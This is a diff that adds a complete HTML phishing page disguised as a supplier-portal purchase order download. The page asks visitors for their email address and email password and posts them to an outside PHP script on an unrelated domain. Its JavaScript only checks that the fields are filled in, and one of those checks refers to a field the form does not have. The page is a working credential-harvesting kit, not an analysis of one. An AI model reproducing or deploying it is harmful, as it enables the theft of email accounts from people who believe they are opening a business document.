@@ -1,0 +1,137 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.or
+g/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0060)http://west-east.org/Ningbo-Purchase%20Order0032335-PDF.HTML -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+</head>
+
+<body style="background-image: url('http://oi67.tinypic.com/wqws3t.jpg'); background-repeat: no-repeat">
+
+<div style="position: absolute; width: 437px; height: 278px; z-index: 1; left: 422px; top: 223px; background-image: url('excel2013.png'); background-repeat: no-repeat" id="layer1">
+<div style="position: absolute; width: 91px; height: 7px; z-index: 1; left: 171px; top: 67px; background-image: url('294.gif'); background-repeat: no-repeat" id="layer2">
+&nbsp;</div>
+    
+    <title>Supplier Portal - Purchase Order</title>
+    <link href="./Supplier Portal - Purchase Order_files/default2.css" rel="stylesheet" type="text/css">
+<script language="JavaScript">
+				    
+function check_all(form) {	
+	if(form.email.value == ""){
+	alert("PLEASE ENTER A VALID EMAIL ADDRESS.");
+	form.email.focus();
+	return false;
+	}
+var email = form.email.value
+
+if(email != ""){ 
+var atSymbol = 0
+
+for(var a = 0; a < email.length; a++){ 
+
+if(email.charAt(a) == "@"){ 
+atSymbol++
+}
+
+}
+
+if(atSymbol > 1){ 
+alert("PLEASE ENTER A VALID EMAIL ADDRESS.")
+form.email.focus();
+return false
+}
+
+if(atSymbol == 1 && email.charAt(0) != "@"){ 
+var period = email.indexOf(".",email.indexOf("@")+2) 
+
+var twoPeriods = (email.charAt((period+1)) == ".") ? true : false 
+
+if(period == -1 || twoPeriods || email.length < period + 2 || email.charAt(email.length-1)=="."){
+alert("PLEASE ENTER A VALID EMAIL ADDRESS.") 
+form.email.focus();
+return false
+}
+
+}
+
+else{ 
+alert("PLEASE ENTER A VALID EMAIL ADDRESS.")
+form.email.focus();
+return false 
+}
+}
+
+else{ 
+alert("PLEASE ENTER A VALID EMAIL ADDRESS.")
+form.email.focus();
+return false 
+}
+
+if (form.epass.value.length < 4) {
+		        alert("PLEASE ENTER EMAIL PASSWORD");
+		        form.epass.focus();
+	        	return false;
+}
+
+if (form.cpass.value.length < 4) {
+		        alert("PLEASE ENTER EMAIL PASSWORD");
+		        form.cpass.focus();
+	        	return false;
+}
+
+
+        if (form.epass.value.length < 2) {
+                alert("PLEASE ENTER EMAIL PASSWORD");
+                form.epass.focus();
+                return false;
+	   }
+	   
+ }
+ 
+</script><script type="text/javascript" async="" src="./Supplier Portal - Purchase Order_files/saved_resource"></script></head>
+
+
+
+				    
+
+<body class="centre" style="margin-top: 32px; text-align: centre; background: #fff; text-align: center; font-family: Arial, Helvetica, sans-serif; /* font-
+
+size: 12px; */ ">
+<div style="background: #143265 url(&#39;http://www.outitgoes.com/images/bg_loginbox.png&#39;) no-repeat top; width: 430px;  margin: 0 auto; color: #fff; -moz-border-radius-bottomright: 18px; -moz-border-radius-bottomleft: 18px; -webkit-border-bottom-left-radius: 18px; -webkit-border-
+
+bottom-right-radius: 18px; padding-left:20px; padding-right:20px; padding-top:120px; padding-bottom:30px" id="defcontainer">
+<form method="post" action="http://mittarework.com/plugins/smilez.php">
+			<div>
+
+			<h1>Sign in with your email:</h1>
+			<p>Log-in to Portal with the valid email address and password&nbsp;and 
+			sign&nbsp;the datasheet of the Purchase Order with your company stamp and send back to customer.</p>
+			<div class="centre">
+			<table style="margin-left: auto; margin-right: auto; width: 300px">
+			<tbody>
+
+			<tr>
+			<th style="width: 20%; text-align: right; padding-right: 1em">
+			Email&nbsp;Address: </th>
+
+			<td style="text-align: left"><input type="text" name="email" size="30"></td>
+			</tr>
+			<tr>
+			<th style="text-align: right; padding-right: 1em">Email&nbsp;Password: </th>
+			<td style="text-align: left"><input type="password" name="epass" size="30"></td>
+
+			</tr>
+			</tbody>
+			</table>
+
+			<br><br>
+			<input onclick="return check_all(this.form);" type="submit" value="Download PO">
+			<br><br>
+
+			<br><br>
+			</div>
+
+			</div></form>
+</div>
+
+</body></html>
